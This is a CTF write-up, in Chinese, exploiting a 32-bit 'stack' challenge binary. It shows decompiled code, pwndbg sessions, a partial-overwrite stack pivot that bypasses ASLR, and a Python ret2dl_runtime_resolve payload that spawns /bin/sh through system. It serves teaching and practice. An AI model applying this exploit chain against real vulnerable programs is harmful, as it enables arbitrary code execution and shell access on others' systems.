# Stack

## 漏洞分析
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [esp+4h] [ebp-14h]

  read(0, &gift, 0x14u);
  read(0, &buf, 0x14u);
  return 0;
}
```
 - 程序中只有俩`read()`
 - 第一个读`0x14`字节到`gift`(堆中)
 - 第二个读`0x14`字节到`buf`(栈中)
 - 第二个`read`存在缓冲区溢出

## 思路
 - 只有`read`无法leak libc -> `ret2dl_runtime_resolve`
 - 栈太小，需要栈迁移 -> 调用`read(0,new_stack,len)`布置新的栈空间

## 栈迁移

```
   0x8048430 <main+37>:	sub    esp,0x4
   0x8048433 <main+40>:	push   0x14
   0x8048435 <main+42>:	lea    eax,[ebp-0x14]
   0x8048438 <main+45>:	push   eax
   0x8048439 <main+46>:	push   0x0
   0x804843b <main+48>:	call   0x80482e0 <read@plt>
   0x8048440 <main+53>:	add    esp,0x10
   0x8048443 <main+56>:	mov    eax,0x0
   0x8048448 <main+61>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x804844b <main+64>:	leave  
=> 0x804844c <main+65>:	lea    esp,[ecx-0x4]
   0x804844f <main+68>:	ret 

# sned: AAAAAAAABBBBBBBBCCCC

pwndbg> x/xw $ecx
0x43434343:	Cannot access memory at address 0x43434343
```

- `mov ecx,DWORD PTR [ebp-0x4]`: `buf+16`的值赋给`ecx`
 - `lea esp,[ecx-0x4]`: 可以控制`esp`,完成栈迁移
 - 即：`buf+16 = new_stack+4`
 - 由于没有可以利用的输出函数，无法泄漏栈地址，只好尝试把栈转移到堆中，可以控制的堆只有`gift`
 - 于是尝试控制`esp`到`gift`,但是可控空间只有`20`字节，需要扩展一下
 - 尝试调用`read`读更多的字节到堆中，但是由于`gift`上面挨着`plt`表

```
pwndbg> x/24xw 0x804a000
0x804a000:	0x08049f14	0xf7ffd950	0xf7fe9780	0xf7ebe7e0
0x804a010 <__libc_start_main@got.plt>:	0xf7def660	0x00000000	0x00000000	0x00000000
0x804a020 <gift>:	0x61616161	0x0000000a	0x00000000	0x00000000
0x804a030 <gift+16>:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000

pwndbg> vmmap
 0x8049000  0x804a000 r--p     1000 0      /home/taqini/Desktop/ctf/京津冀2019线下/stack
 0x804a000  0x804b000 rw-p     1000 1000   /home/taqini/Desktop/ctf/京津冀2019线下/stack
```

 - `plt`表以上的空间就不可写了，不符合栈可写的特点，因此无法实现正常的栈操作，调用`read`时会失败
 - 于是放弃了这个`gift`

 - 也就是说，`read`只能在可控的栈内执行，目前可控的区域只有`gift`和`buf`，`gift`不行，就只有`buf`了
 - 先看一下程序正常运行时的栈分布

```
pwndbg> r
Starting program: /home/taqini/Desktop/ctf/京津冀2019线下/stack 
AAAA
AAAAAAAABBBBBBBB
Breakpoint 1, 0x0804844c in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0xffffcd10 ◂— 0x1
 EDX  0x14
 EDI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dbd6c
 ESI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dbd6c
 EBP  0x0
 ESP  0xffffccfc —▸ 0xf7def751 (__libc_start_main+241) ◂— add    esp, 0x10
 EIP  0x804844c (main+65) ◂— 0xc3fc618d
───────────────────────────────────────[ DISASM ]───────────────────────────────────────
 ► 0x804844c  <main+65>                  lea    esp, [ecx - 4]
   0x804844f  <main+68>                  ret    
    ↓
   0xf7def751 <__libc_start_main+241>    add    esp, 0x10
   0xf7def754 <__libc_start_main+244>    sub    esp, 0xc
   0xf7def757 <__libc_start_main+247>    push   eax
   0xf7def758 <__libc_start_main+248>    call   exit <0xf7e06a30>
 
   0xf7def75d <__libc_start_main+253>    push   esi
   0xf7def75e <__libc_start_main+254>    push   esi
   0xf7def75f <__libc_start_main+255>    mov    ecx, dword ptr [esp + 0x70]
   0xf7def763 <__libc_start_main+259>    push   dword ptr [ecx]
   0xf7def765 <__libc_start_main+261>    mov    ecx, dword ptr [esp + 0x14]
───────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ esp  0xffffccfc —▸ 0xf7def751 (__libc_start_main+241) ◂— add    esp, 0x10
01:0004│      0xffffcd00 —▸ 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dbd6c
... ↓
03:000c│      0xffffcd08 ◂— 0x0
04:0010│      0xffffcd0c —▸ 0xf7def751 (__libc_start_main+241) ◂— add    esp, 0x10
05:0014│ ecx  0xffffcd10 ◂— 0x1
06:0018│      0xffffcd14 —▸ 0xffffcda4 —▸ 0xffffcfa6 ◂— 0x6d6f682f ('/hom')
07:001c│      0xffffcd18 —▸ 0xffffcdac —▸ 0xffffcfd9 ◂— 'SSH_AUTH_SOCK=/run/user/1000/keyring/ssh'
─────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────
 ► f 0  804844c main+65
   f 1 f7def751 __libc_start_main+241
────────────────────────────────────────────────────────────────────────────────────────
Breakpoint *0x804844c

pwndbg> x/xw $ecx-4
0xffffcd0c:	0xf7def751

pwndbg> search AAAAAAAA
[stack]         0xffffcce4 0x41414141 ('AAAA')

pwndbg> x/24xw 0xffffcce4
0xffffcce4:	0x41414141	0x41414141	0x42424242	0x42424242
0xffffccf4:	0xffffcd10	0x00000000	0xf7def751	0xf7fad000
0xffffcd04:	0xf7fad000	0x00000000	0xf7def751	0x00000001
0xffffcd14:	0xffffcda4	0xffffcdac	0xffffcd34	0x00000001
0xffffcd24:	0x00000000	0xf7fad000	0xffffffff	0xf7ffd000
0xffffcd34:	0x00000000	0xf7fad000	0xf7fad000	0x00000000
```

 - `buf`首地址：`0xffffcce4`
 - `buf+16`保存`ecx`的值: `0xffffcd10`
 - `0xffffcd10-0xffffcce4=44` 
 - 由于开了ASLR保护机制，栈基址每次都变化，但是`buf`首地址和`buf+16`处的`ecx`的值的相对位置固定，相差`44`
 - 于是可以只覆盖`buf+16`位置的保存的`ecx`的值末位，构造出栈地址，先想办法把栈迁移到`buf`中

```python
    buf = p32(read_plt) + p32(main) + p32(0) + p32(base_stage) + '\x78'
```

 - 这里由于开了`ASLR`，`buf`的地址每次都变:
 - 比如当`buf`首地址为`0xffffcd74`时，`ecx=buf+44=0xffffcda0`，`buf`和`ecx`只有末位字节不同，这时候只要覆盖`buf+16处的ecx`末位为`0x78`
 - 在`lea esp,[ecx-0x4]`执行后，即可控制`esp`到`buf`执行`read`函数
 - 这时实际的`rop`链为：

```python
    buf = p32(read_plt) + p32(main) + p32(0) + p32(base_stage) + p32(0xffffcd78) # <- 0xffffcd78 为构造的栈地址，同时充当read的第三个参数
```

 - 执行的函数为`read(0,base_stage,0xffffcd78)`
 - `base_stage`位于`bss`段

## `ret2dl_runtime_resolve`
 - 参考这里: http://pwn4.fun/2016/11/09/Return-to-dl-resolve/
 - 构造payload:

```
    cmd = '/bin/sh'
    plt_0 = 0x080482d0
    rel_plt = 0x08048298
    index_offset = base_stage+28 - rel_plt
    read_got = elf.got['read']
    dynsym = 0x080481cc
    dynstr = 0x0804821c
    fake_sym_addr = base_stage + 36
    align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
    fake_sym_addr = fake_sym_addr + align
    index_dynsym = (fake_sym_addr - dynsym) / 0x10
    r_info = (index_dynsym << 8) | 0x7
    fake_reloc = p32(read_got) + p32(r_info)
    st_name = (fake_sym_addr + 0x10) - dynstr
    fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

    pl3 = 'AAAA'
    pl3 += p32(plt_0)
    pl3 += p32(index_offset)
    pl3 += 'AAAA'
    pl3 += p32(base_stage + 80)
    pl3 += 'aaaa'
    pl3 += 'aaaa'
    pl3 += fake_reloc # (base_stage+28)
    pl3 += 'B' * align
    pl3 += fake_sym # (base_stage+36)
    pl3 += "system\x00"
    pl3 += 'A' * (80 - len(pl3))
    pl3 += cmd + '\x00'
    pl3 += 'A' * (100 - len(pl3))
```

- 然后把控制栈，迁移到`base_stage+4`即可getshell

```
    # rop2
    sleep(1)

    se('a'*0x14)
    pl4 = p32(0xdeadbeef)*4 + p32(base_stage+4+4)

    se(pl4)

```

